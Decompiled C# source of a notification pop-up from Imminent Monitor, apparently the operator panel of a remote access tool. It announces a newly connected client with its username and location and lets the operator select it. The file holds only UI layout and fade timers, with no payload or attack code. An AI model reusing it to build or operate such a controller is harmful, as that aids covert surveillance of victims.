// Decompiled with JetBrains decompiler
// Type: FormToast
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormToast : Form
{
  private IContainer icontainer_0;
  private PictureBox pictureBox_0;
  private Label label_0;
  private Label label_1;
  private Label label_2;
  private PictureBox pictureBox_1;
  private Label label_3;
  private System.Windows.Forms.Timer timer_0;
  private System.Windows.Forms.Timer timer_1;
  private Label label_4;
  private GControl3 gcontrol3_0;
  private GControl5 gcontrol5_0;
  private int int_0;
  private bool bool_0;
  private GClass18 gclass18_0;

  public FormToast(int int_1, GClass18 gclass18_1, Image image_0)
  {
    this.Load += new EventHandler(this.FormToast_Load);
    this.bool_0 = false;
    this.InitializeComponent();
    this.int_0 = int_1;
    this.gclass18_0 = gclass18_1;
    this.vmethod_4().Text = string.Format("Username: {0}", (object) this.gclass18_0.method_20().string_1);
    this.vmethod_10().Text = this.gclass18_0.method_20().string_7;
    this.vmethod_8().Image = image_0;
    Class97.smethod_11((Form) this);
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    this.vmethod_1(new PictureBox());
    this.vmethod_3(new Label());
    this.vmethod_5(new Label());
    this.vmethod_7(new Label());
    this.vmethod_9(new PictureBox());
    this.vmethod_11(new Label());
    this.vmethod_13(new System.Windows.Forms.Timer(this.icontainer_0));
    this.vmethod_15(new System.Windows.Forms.Timer(this.icontainer_0));
    this.vmethod_17(new Label());
    this.vmethod_21(new GControl5());
    this.vmethod_19(new GControl3());
    ((ISupportInitialize) this.vmethod_0()).BeginInit();
    ((ISupportInitialize) this.vmethod_8()).BeginInit();
    this.SuspendLayout();
    this.vmethod_0().Image = (Image) Class145.smethod_5();
    PictureBox pictureBox1 = this.vmethod_0();
    Point point1 = new Point(6, 2);
    Point point2 = point1;
    pictureBox1.Location = point2;
    this.vmethod_0().Name = "PictureBox1Logo";
    PictureBox pictureBox2 = this.vmethod_0();
    Size size1 = new Size(42, 42);
    Size size2 = size1;
    pictureBox2.Size = size2;
    this.vmethod_0().SizeMode = PictureBoxSizeMode.StretchImage;
    this.vmethod_0().TabIndex = 0;
    this.vmethod_0().TabStop = false;
    this.vmethod_2().AutoSize = true;
    this.vmethod_2().Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_2().ForeColor = Color.Black;
    Label label1 = this.vmethod_2();
    point1 = new Point(3, 48);
    Point point3 = point1;
    label1.Location = point3;
    this.vmethod_2().Name = "LabelConnected";
    Label label2 = this.vmethod_2();
    size1 = new Size(107, 15);
    Size size3 = size1;
    label2.Size = size3;
    this.vmethod_2().TabIndex = 2;
    this.vmethod_2().Text = "Client Connected -";
    this.vmethod_4().AutoSize = true;
    this.vmethod_4().Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_4().ForeColor = Color.Black;
    Label label3 = this.vmethod_4();
    point1 = new Point(3, 66);
    Point point4 = point1;
    label3.Location = point4;
    this.vmethod_4().Name = "LabelUsername";
    Label label4 = this.vmethod_4();
    size1 = new Size(66, 15);
    Size size4 = size1;
    label4.Size = size4;
    this.vmethod_4().TabIndex = 3;
    this.vmethod_4().Text = "Username: ";
    this.vmethod_6().AutoSize = true;
    this.vmethod_6().Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_6().ForeColor = Color.Black;
    Label label5 = this.vmethod_6();
    point1 = new Point(4, 84);
    Point point5 = point1;
    label5.Location = point5;
    this.vmethod_6().Name = "LabelLocation";
    Label label6 = this.vmethod_6();
    size1 = new Size(59, 15);
    Size size5 = size1;
    label6.Size = size5;
    this.vmethod_6().TabIndex = 4;
    this.vmethod_6().Text = "Location: ";
    PictureBox pictureBox3 = this.vmethod_8();
    point1 = new Point(58, 83);
    Point point6 = point1;
    pictureBox3.Location = point6;
    this.vmethod_8().Name = "PictureBoxCountry";
    PictureBox pictureBox4 = this.vmethod_8();
    size1 = new Size(16, 16);
    Size size6 = size1;
    pictureBox4.Size = size6;
    this.vmethod_8().TabIndex = 5;
    this.vmethod_8().TabStop = false;
    this.vmethod_10().AutoSize = true;
    this.vmethod_10().Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_10().ForeColor = Color.Black;
    Label label7 = this.vmethod_10();
    point1 = new Point(76, 84);
    Point point7 = point1;
    label7.Location = point7;
    this.vmethod_10().Name = "LabelLocationText";
    Label label8 = this.vmethod_10();
    size1 = new Size(0, 15);
    Size size7 = size1;
    label8.Size = size7;
    this.vmethod_10().TabIndex = 6;
    this.vmethod_12().Enabled = true;
    this.vmethod_12().Interval = 1;
    this.vmethod_14().Interval = 1;
    this.vmethod_16().AutoSize = true;
    this.vmethod_16().BackColor = Color.White;
    this.vmethod_16().Font = new Font("Segoe UI", 10f);
    this.vmethod_16().ForeColor = Color.FromArgb(118, 128, 128);
    Label label9 = this.vmethod_16();
    point1 = new Point(54, 15);
    Point point8 = point1;
    label9.Location = point8;
    this.vmethod_16().Name = "Label1";
    Label label10 = this.vmethod_16();
    size1 = new Size(122, 19);
    Size size8 = size1;
    label10.Size = size8;
    this.vmethod_16().TabIndex = 8;
    this.vmethod_16().Text = "Imminent Monitor";
    this.vmethod_20().BackColor = Color.White;
    GControl5 gcontrol5_1 = this.vmethod_20();
    point1 = new Point(-1, 108);
    Point point9 = point1;
    gcontrol5_1.Location = point9;
    this.vmethod_20().Name = "NotificationButton1";
    GControl5 gcontrol5_2 = this.vmethod_20();
    size1 = new Size(354, 37);
    Size size9 = size1;
    gcontrol5_2.Size = size9;
    this.vmethod_20().TabIndex = 10;
    this.vmethod_20().Text = "Select Client";
    this.vmethod_18().BackColor = Color.White;
    GControl3 gcontrol3_1 = this.vmethod_18();
    point1 = new Point(318, 1);
    Point point10 = point1;
    gcontrol3_1.Location = point10;
    this.vmethod_18().Name = "PushButton1";
    GControl3 gcontrol3_2 = this.vmethod_18();
    size1 = new Size(33, 31);
    Size size10 = size1;
    gcontrol3_2.Size = size10;
    this.vmethod_18().TabIndex = 9;
    this.vmethod_18().Text = "PushButton1";
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    size1 = new Size(352, 142);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_20());
    this.Controls.Add((Control) this.vmethod_18());
    this.Controls.Add((Control) this.vmethod_16());
    this.Controls.Add((Control) this.vmethod_10());
    this.Controls.Add((Control) this.vmethod_8());
    this.Controls.Add((Control) this.vmethod_6());
    this.Controls.Add((Control) this.vmethod_4());
    this.Controls.Add((Control) this.vmethod_2());
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.FormBorderStyle = FormBorderStyle.None;
    this.Name = nameof (FormToast);
    this.Opacity = 0.0;
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.StartPosition = FormStartPosition.CenterScreen;
    ((ISupportInitialize) this.vmethod_0()).EndInit();
    ((ISupportInitialize) this.vmethod_8()).EndInit();
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual PictureBox vmethod_0() => this.pictureBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(PictureBox pictureBox_2) => this.pictureBox_0 = pictureBox_2;

  internal virtual Label vmethod_2() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(Label label_5) => this.label_0 = label_5;

  internal virtual Label vmethod_4() => this.label_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(Label label_5) => this.label_1 = label_5;

  internal virtual Label vmethod_6() => this.label_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(Label label_5) => this.label_2 = label_5;

  internal virtual PictureBox vmethod_8() => this.pictureBox_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(PictureBox pictureBox_2) => this.pictureBox_1 = pictureBox_2;

  internal virtual Label vmethod_10() => this.label_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(Label label_5) => this.label_3 = label_5;

  internal virtual System.Windows.Forms.Timer vmethod_12() => this.timer_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(System.Windows.Forms.Timer timer_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_4);
    if (this.timer_0 != null)
      this.timer_0.Tick -= eventHandler;
    this.timer_0 = timer_2;
    if (this.timer_0 == null)
      return;
    this.timer_0.Tick += eventHandler;
  }

  internal virtual System.Windows.Forms.Timer vmethod_14() => this.timer_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(System.Windows.Forms.Timer timer_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_5);
    if (this.timer_1 != null)
      this.timer_1.Tick -= eventHandler;
    this.timer_1 = timer_2;
    if (this.timer_1 == null)
      return;
    this.timer_1.Tick += eventHandler;
  }

  internal virtual Label vmethod_16() => this.label_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(Label label_5) => this.label_4 = label_5;

  internal virtual GControl3 vmethod_18() => this.gcontrol3_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(GControl3 gcontrol3_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_0);
    if (this.gcontrol3_0 != null)
      this.gcontrol3_0.Click -= eventHandler;
    this.gcontrol3_0 = gcontrol3_1;
    if (this.gcontrol3_0 == null)
      return;
    this.gcontrol3_0.Click += eventHandler;
  }

  internal virtual GControl5 vmethod_20() => this.gcontrol5_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(GControl5 gcontrol5_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_1);
    if (this.gcontrol5_0 != null)
      this.gcontrol5_0.Click -= eventHandler;
    this.gcontrol5_0 = gcontrol5_1;
    if (this.gcontrol5_0 == null)
      return;
    this.gcontrol5_0.Click += eventHandler;
  }

  private void FormToast_Load(object sender, EventArgs e) => this.Location = new Point(Screen.PrimaryScreen.WorkingArea.Width - this.Width - 10, Screen.PrimaryScreen.WorkingArea.Height - this.Height - 10 - (this.Size.Height + 10) * this.int_0);

  private void method_0(object sender, EventArgs e) => this.vmethod_14().Start();

  private void method_1(object sender, EventArgs e)
  {
    this.method_2(0);
    Class97.formMain_0.vmethod_0().vmethod_108().Items[this.gclass18_0.method_20().listViewItem_4.Index].Selected = true;
    Class97.formMain_0.vmethod_0().vmethod_108().Items[this.gclass18_0.method_20().listViewItem_4.Index].EnsureVisible();
  }

  private void method_2(int int_1)
  {
    this.method_3();
    Class97.formMain_0.vmethod_2().Show();
    Class97.formMain_0.vmethod_2().SelectedIndex = int_1;
    Class97.smethod_20(Class97.formMain_0.vmethod_58(), "$('.page').empty();");
    Class97.formMain_0.vmethod_2().Focus();
  }

  public void method_3()
  {
    Class97.formMain_0.vmethod_2().Hide();
    Class97.formMain_0.vmethod_8().Hide();
    Class97.formMain_0.vmethod_54().Hide();
  }

  private void method_4(object sender, EventArgs e)
  {
    if (this.Opacity < 1.0)
      this.Opacity += 0.01;
    if (this.Opacity < 1.0)
      return;
    new Thread(new ThreadStart(this.method_6)).Start();
    this.vmethod_12().Stop();
  }

  private void method_5(object sender, EventArgs e)
  {
    this.bool_0 = true;
    if (this.Opacity > 0.1)
    {
      this.Opacity -= 0.03;
    }
    else
    {
      Class97.formToast_0[this.int_0] = (FormToast) null;
      this.Close();
    }
  }

  private void method_6()
  {
    Thread.Sleep(3000);
    if (this.bool_0)
      return;
    this.Invoke((Delegate) (() => this.vmethod_14().Start()));
  }

  [SpecialName]
  protected override bool get_ShowWithoutActivation() => true;

  [SpecialName]
  protected override CreateParams get_CreateParams()
  {
    CreateParams createParams = base.CreateParams;
    createParams.ExStyle |= 8;
    createParams.ClassStyle |= 131072;
    return createParams;
  }

  public bool SortById { [SpecialName] get; [SpecialName] set; }

  public bool SortByOperatingSystem { [SpecialName] get; [SpecialName] set; }
}
